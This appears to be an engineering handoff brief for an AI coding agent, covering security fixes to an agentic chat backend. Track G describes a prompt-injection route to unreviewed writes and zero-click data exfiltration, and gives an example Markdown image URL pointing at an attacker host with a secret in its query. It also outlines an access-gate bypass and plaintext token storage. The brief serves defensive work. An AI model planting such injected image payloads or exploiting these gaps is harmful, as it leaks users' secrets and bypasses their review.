<!-- tasker/20-agentic-chat-wave3-security-brief.md -->

# Task 20 — Agentic Chat Backend: Wave 3 (Security) + Wave 2 tail

> **2026-08-30 implementation update:** the Wave 3 security work is implemented and deployed. The
> immediate boundary slice is live: **S2** blocks automatic third-party images only in assistant Markdown; **C1**
> authorizes every resolved project in legacy/prewarm and fails closed on unusable project RPC
> results; **S5/S8** encrypts new bootstrap bearer payloads, consumes setup links once, and reaps
> expired links (the migration is applied and the production encryption key is configured).
> **S1/S3 are implemented and deployed:** the retained synchronous chat
> executor uses the shared op-policy classification, external-content reads downgrade later writes
> to review, destructive/opaque writes require operation-bound confirmation, and materialization
> cannot widen the confirmed write surface. **Track H is also complete:** C2's unsigned client
> prewarm payload has already been ignored since the August 26 stream refactor, and S7's explicit
> project-scope plus soft-delete fences were already present; both are now covered by direct
> regressions. **Track I is now implemented:** per-user burst/concurrency controls, public gateway
> throttling, bounded sensitive-artifact retention, model/log PII reductions, untrusted worker
> transcript wrappers, per-user fetched-page caching, and removal of production dump escapes. The
> `20260830010000_agentic_chat_track_i_hardening.sql` migration is applied in production and
> recorded in migration history; fresh `public` + `libri` types are generated and build cleanly.
> **D4b is now implemented and its migration is applied:** the Node host registers the named turn
> promise through pinned `@vercel/functions`, but changes detached-stream closure only after a real
> Vercel request context accepts it; a one-minute, `CRON_SECRET`-protected route invokes a bounded,
> service-only stale-legacy-turn reaper. The second-pass review moved the schedule into the
> Vercel project's effective `apps/web/vercel.json`. The complete follow-up Production deployment
> exposes the protected route (unauthenticated requests return 401), registers its 30-second
> Node function, and produced a successful zero-row receipt at `2026-08-30T17:01:04Z`.
> `AGENT_CHAT_LEGACY_WAIT_UNTIL_ENABLED` is absent in
> Production, so the lifecycle change remains off there pending the Preview detach/reconcile smoke.

**For:** a fresh agent in a new chat. This brief is self-contained — you do not need any prior conversation.
**Created:** 2026-07-04
**Type:** implementation handoff (execute the remaining agentic-chat backend fixes).

---

## 0. Read this first (context in 60 seconds)

There is a deep backend audit of the agentic chat system at:

- **`apps/web/docs/technical/audits/AGENTIC_CHAT_BACKEND_AUDIT_2026-07-01_DEEP.md`** ← the authoritative source. Every finding (D1…D11, S1…S17, C1…C8, O2…O16) is described there with `file:line` citations and CONFIRMED/SUSPECTED marks. **Read the "Severity summary" table + Theme 4/5 + the "Fix waves" section before starting.**
- Companion (original, lighter): `AGENTIC_CHAT_BACKEND_AUDIT_2026-07-01.md`.

**Already done & committed (do NOT redo):** Wave 1 + Wave 2 (Batches 1–3) — the entire data-integrity / false-success / cancellation / durability / LLM-robustness / transactional-create cluster (18 findings, tagged **FIXED** in the doc). Your job is **Wave 3 (Security)** plus a small **Wave 2 tail**.

**Entry points / hot files** (you will touch several; they are large and shared, so edit carefully):

- `apps/web/src/routes/api/agent/v2/stream/+server.ts` — the streaming endpoint (~4,400 lines).
- `apps/web/src/lib/services/agentic-chat-v2/stream-orchestrator/index.ts` — the turn loop.
- `apps/web/src/lib/services/agentic-chat/…` — tool execution, executors, gateway surface, tool registry.
- `packages/shared-agent-ops/src/…` — op policy/scope (`policy.ts`), gateway, ontology.
- `apps/web/src/lib/components/agent/AgentMessageList.svelte` + `apps/web/src/lib/utils/markdown.ts` — chat rendering.

---

## 1. Working conventions (follow these)

- **Package manager is `pnpm`, never npm.** Formatting: tabs, single quotes, no trailing commas, 100-col (Prettier). Svelte 5 runes only. Read neighboring code before writing.
- **Re-verify every finding against current code first.** The audit's line numbers were captured 2026-07-01 and have drifted after Waves 1–2. Find the real code; don't trust the citation blindly.
- **Add a test for every behavioral change.** Run targeted tests: `cd apps/web && pnpm exec vitest run <path>`. Typecheck: `cd apps/web && pnpm run check` (svelte-check).
- **KNOWN pre-existing noise — do not get blocked by it:** `pnpm run check` currently reports ~15 errors in **`apps/web/src/lib/services/admin/chat-session-audit-compact.ts`** (null-safety). That file is a **different workstream's** audit tooling, NOT part of this task. Ignore those 15; just make sure YOUR files add zero new errors. (There is also one long-standing warning in `routes/onboarding/+page.svelte` — also not yours.)
- **Migrations:** put new files in `supabase/migrations/` with a timestamp later than `20260702020000`, matching the style of recent migrations. After adding a migration, note that `pnpm gen:types` must run (don't run the full `pnpm gen:all` mid-task; just flag it).
- **Shared package dist is gitignored:** if you edit `packages/shared-agent-ops` or `packages/smart-llm`, note they must be rebuilt (`pnpm --filter=@buildos/shared-agent-ops build`) for the running app/worker to pick up changes.
- **Batch to avoid collisions.** `+server.ts` and `stream-orchestrator/index.ts` are edited by multiple findings. If you parallelize with sub-agents, give each a **disjoint file lane**; otherwise do it sequentially. Do NOT run two agents editing the same file at once.
- **Commit / review:** leave changes uncommitted for review unless the repo owner tells you to commit. Validate before handing back (targeted tests + `pnpm run check` scoped to your files).

---

## 2. Wave 2 tail — do these FIRST (small, unblock the rest)

**Completed 2026-08-30:** items 1–3 are closed. Production types were regenerated, the temporary
`commit_started_at` query casts were removed (`onto_task_create_with_relationships_atomic` was
already typed), `timing_metrics` has live RLS with owner/admin-select policies, and the existing
disposable PostgreSQL regressions pass for relationship/assignee rollback plus idempotent replay.
Item 4 remains explicitly skipped: child rows require the project FK/RLS parent to exist first, so
project-row-last is not viable without a broader schema redesign; an incomplete/finalized marker
would require a migration and every project reader to adopt the fence. The current best-effort
compensating cleanup remains in place.

1. **`pnpm gen:types`** for the three migrations already merged (`20260701020000` timing_metrics RLS, `20260702000000` last_progress_at + commit_started_at, `20260702010000` idempotency_key + `onto_task_create_atomic`). Then tighten the temporary `as never` / `as any` casts they left in `packages/shared-agent-ops/src/gateway/change-set.ts` (around the `commit_started_at` reads) and in `apps/web/src/routes/api/onto/tasks/create/+server.ts` (the `onto_task_create_atomic` call).
2. **Verify the S4 RLS migration landed live:** `select relrowsecurity from pg_class where relname='timing_metrics';` should be `true`. Confirm the admin timing dashboard (`/api/admin/chat/timing`) still reads (it relies on `is_admin()`).
3. **Add the missing D7 tests** (they were never written): (a) `onto_task_create_atomic` rolls back the task row when edge/assignee insertion fails (no orphan task); (b) a create with a duplicate `Idempotency-Key` returns the existing row instead of inserting a second. See `onto_task_update_atomic` + its route usage for the mirror pattern.
4. **(Optional, was deferred in D7):** `packages/shared-agent-ops/src/ontology/instantiation.service.ts` still inserts the project row FIRST — a mid-way crash leaves a visible half-built project. Lower-risk mitigation: insert the project row last / mark it incomplete until finalized. Only if cheap; note the tradeoff if you skip.

---

## 3. Wave 3 — Security hardening (the main work)

**Why this is the pass:** with data-integrity/durability done, the highest-severity remaining findings are all security, including the only two remaining **CRITICALs**. Theme: _the action side of interactive chat lacks the policy layer that Agent Runs already have._ Three tracks. Track G is the flagship; H and I can parallelize once G's design is set. Full detail per finding is in the audit doc's Theme 5 — cited below with the audit's (possibly-drifted) line numbers.

### Track G — Prompt-injection → mutation/exfiltration chain (flagship; S1 + S3 + S2 are one problem)

**Do S2 first — it's self-contained and closes the exfiltration half immediately.**

- **S2 (HIGH) — zero-click image exfiltration.** Assistant messages render via `{@html renderMarkdown(...)}` (`AgentMessageList.svelte:314,351`); `sanitizeOptions` allows remote `<img src>` with no scheme restriction (`utils/markdown.ts:39,50`). An injected `![](https://attacker/leak?d=SECRET)` auto-fetches attacker.com on render. **Fix:** in the assistant-message markdown profile, drop `img` (or restrict `src` to same-origin/`data:`), or add a chat-surface CSP `img-src`. Keep `renderBlogMarkdown` (trusted content) unchanged. Add a test asserting a remote-image URL is stripped/neutralized.

- **S1 (CRITICAL) — IMPLEMENTED AND DEPLOYED (W3).** The retained synchronous executor now classifies operations through `packages/shared-agent-ops/src/policy.ts` at the last dispatch boundary. Successful web/email/calendar/document-body/MCP reads set a turn-local external-content flag; later writes return a durable `requires_user_action` review result instead of executing. Delete, unlink, graph-reorg, change-set commit, and opaque MCP operations require an explicit later confirmation bound to the exact reviewed tool. Ordinary internal metadata reads retain the existing fast path.

- **S3 (HIGH) — IMPLEMENTED AND DEPLOYED (W3).** `materializeGatewayTools` accepts an execution-boundary allow policy and reports denied tools. On-miss and discovery materialization consult the same S1 decision as execution, so an uncommissioned write is not mounted, external-content turns cannot widen to writes, and a confirmation turn exposes only the exact reviewed mutation plus reads. The dispatch boundary checks again before auto-execution.

_Sequence:_ S2 (ship alone) → then S1 + S3 together (shared design: the policy layer + the per-turn external-content flag both gates consult).

### Track H — Access & trust boundaries (parallel with G once its design is set)

- **C1 (HIGH) — ontology chats bypass the member-access gate.** `isProjectScopedContext` is true only for `project` (`agentic-chat/tools/…/scope.ts` ~52-56), but `resolveRpcContextType` maps `ontology`+projectId to the project RPC path (~72-82). The stream/prewarm member gate runs only for project-scoped contexts (`stream/+server.ts` ~2049, `prewarm/+server.ts` ~287), so `ontology` skips it; on RPC-null the loader silently falls back to RLS-scoped manual queries (`context-loader.ts` ~2988-3001), and RLS allows public reads. Net: an authenticated non-member can hydrate a public project's full context. **Fix:** run `checkProjectAccess` for any resolved projectId regardless of `contextType`; treat RPC-null on the project path as terminal (no RLS fallback); UUID-validate `focusEntityId`/`projectId` at the request boundary (a non-UUID focus id is a deliberate fallback-forcing lever).

- **C2 (HIGH) — FIXED (W3, verified 2026-08-29).** The retained stream accepts the legacy `prewarmedContext` field only for wire compatibility but never reads its unsigned prompt data. It uses a nonce-protected prepared prompt, a server-owned session cache, or a fresh server load; the forged-client route regression asserts `fresh_load` and no request-prewarm hit.

- **S7 (MEDIUM) — FIXED (W3, verified 2026-08-29).** The archived-project fallback runs only when the project is inside an explicit `scope.project_ids` list; `includeArchived` still applies `deleted_at IS NULL`; normal write-access enforcement runs after fallback resolution. Direct tests now cover out-of-scope rejection and in-scope archived access with the soft-delete fence.

### Track I — Abuse limits & secrets/PII hygiene (IMPLEMENTED; migration applied)

- **S6 (MEDIUM) — IMPLEMENTED (W3, migration applied).** Authenticated legacy and worker admission share a per-user token bucket; legacy admission atomically caps running turns at two under the existing per-user database lock, while worker admission already caps two running/twenty queued. Bootstrap and the unauthenticated BuildOS gateway are IP-rate-limited before security-event work.
- **S5 / S8 (HIGH/MEDIUM) — bootstrap token.** `apps/web/src/lib/server/agent-call/bootstrap-link.service.ts` (~176-184) stores a **plaintext** `boca_` bearer token at rest, never reaped (~231-235); the setup token travels in the URL path, fetched unauthenticated, multi-use for 30 min. **Fix:** encrypt the payload (reuse `calendar-token-crypto`), single-use atomic consume, reap expired rows in the retention cron.
- **Hygiene sweep (LOW–MEDIUM) — IMPLEMENTED (W3; S11/S16 migration applied):** S9 logs only bounded argument previews and search lengths; S13 removes database details/hints from model-facing errors; S14 wraps web/calendar worker results as untrusted external data; S10/S12 have scheduled 14-day prompt/prepared retention and `rendered_dump_text` is permanently retired for new rows; S11 adds scheduled bounded 30-day tool-execution/event cleanup; S15 was superseded by service-role-only observability writes; S16 keys fetched page bodies by `(user_id, normalized_url)` in chat and Agent Runs; S17 makes local prompt dumps impossible outside dev.

**Suggested Wave 3 sequencing:** Wave 2 tail (§2) → **S2** → design + build **S1 + S3** (one PR / tight set) → Tracks H and I in parallel. Keep S1's policy-layer change and each migration in their own reviewable PRs.

---

## 4. D4b detached lifecycle and stale-turn recovery — DEPLOYED; Production flag off

- **D4b (Wave 2 tail, infra) — IMPLEMENTED 2026-08-30.** The retained Node stream host uses
  `@vercel/functions` rather than Edge-only `event.platform.context`; detached closure remains
  gated until registration succeeds. A one-minute Vercel cron reaps only stale `legacy_sse` rows.

**Pinned-runtime result:** the pinned
`@sveltejs/adapter-vercel@6.3.3` only places `context.waitUntil` on `event.platform` for Edge
functions; its Node serverless adapter does not populate `event.platform`. This route is pinned to
`nodejs22.x`, so the implementation must use Vercel's supported
[`@vercel/functions` `waitUntil`](https://vercel.com/docs/functions/functions-api-reference/vercel-functions-package)
helper, not the original `event.platform` proposal. `waitUntil` remains bounded by the route's
300-second `maxDuration`.

**Implementation and production receipt:**

1. `@vercel/functions@3.9.5` is pinned. The legacy host names its turn promise, proves the Vercel
   request context has `waitUntil`, registers the promise, and closes a detached sink only when that
   registration succeeded. Missing context or a registration error preserves the old open-stream
   behavior. The existing 300-second timeout/abort boundary is unchanged. Legacy terminal writes
   now require the row to still be `running`, so a thawed invocation cannot overwrite a reaper
   cancellation with `completed`/`failed`.
2. Migration `20260830155952_agentic_chat_stale_legacy_turn_reaper.sql` is applied in Production and
   recorded in migration history. Its service-only `SECURITY DEFINER` RPC has a blank search path,
   a 120-second minimum staleness floor, a 1,000-row database cap, `FOR UPDATE SKIP LOCKED`, and a
   partial progress index. Live verification confirmed `anon=false`, `authenticated=false`,
   `service_role=true`; a rollback-only service-role call found zero stale turns.
3. `/api/cron/agentic-chat-stale-turns` requires the existing `CRON_SECRET`, caps each invocation at
   500 rows / 30 seconds, returns no row identities, writes a bounded `cron_logs` receipt, and is
   scheduled every minute in the effective `apps/web/vercel.json`. The corrected Production
   deployment packages the route as a 30-second Node function, unauthenticated requests return 401,
   and the first verified receipt at `2026-08-30T17:01:04Z` reports success with zero stale turns.
   The next minute safely continues when `has_more=true`.
4. Generated `public` + `libri` types include the reaper RPC. Disposable PostgreSQL coverage proves
   service-only ACLs, fresh heartbeat and worker protection, the age floor, batch behavior, and
   idempotence; Vitest covers flag parsing, registration, detached closure, cron auth/bounds, and
   fixed public errors. Svelte diagnostics report 0 errors and 0 warnings.
5. `AGENT_CHAT_LEGACY_WAIT_UNTIL_ENABLED=true` is staged for all Preview branches. Production
   remains deliberately off because the variable is absent there. After the Preview deploy, detach
   a real legacy request and verify the turn terminalizes within the 300-second function budget
   while the SSE response closes cleanly before enabling the Production flag.

---

## 5. Later (not this task, for awareness)

- **Wave 4 — correctness polish:** O2/O3 (mutation-request heuristic false pos/neg; guard clobbering supervisor questions), O4/O5 (skill payload double-truncation), O9/O10 (alternating-loop repetition guard; sticky `hasWriteAttempt`), O11–O16; C3/C4/C5 (RPC-fallback parity; bounded fallback fetches; prepared-prompt amplification); tool-surface trim (the #1 prompt-size lever) + `+server.ts` decomposition.
- **Wave 5 — observability:** prewarm hit-rate dashboard + `cache_source` / `context_load_source` logging + D11 error-frame surfacing. **Worth pulling forward to run alongside Wave 3** so the injection-defense + rate-limit changes are measurable.

---

## 6. Definition of done for this task

- Wave 2 tail (§2 items 1–3) complete; item 4 done or explicitly skipped-with-reason.
- Track G (S2, S1, S3), Track H (C1, C2, S7), Track I (S6, S5/S8, hygiene sweep) implemented, each with tests where behavioral.
- `pnpm run check` adds **zero** new errors in your files (the ~15 pre-existing `chat-session-audit-compact.ts` errors are not yours).
- Targeted test suites green.
- The audit doc's Severity table + "Fix waves" section updated: mark each finding **FIXED (W3)** with a one-line note, mirroring how Waves 1–2 are recorded there.
- D4b code, cron, migration, generated types, automated contracts, and corrected Production app
  deployment complete; the Production lifecycle flag remains off until the
  Preview detach/reconcile smoke passes.
- Any new migration flagged for `pnpm gen:types` + prod apply; any shared-package edit flagged for dist rebuild.
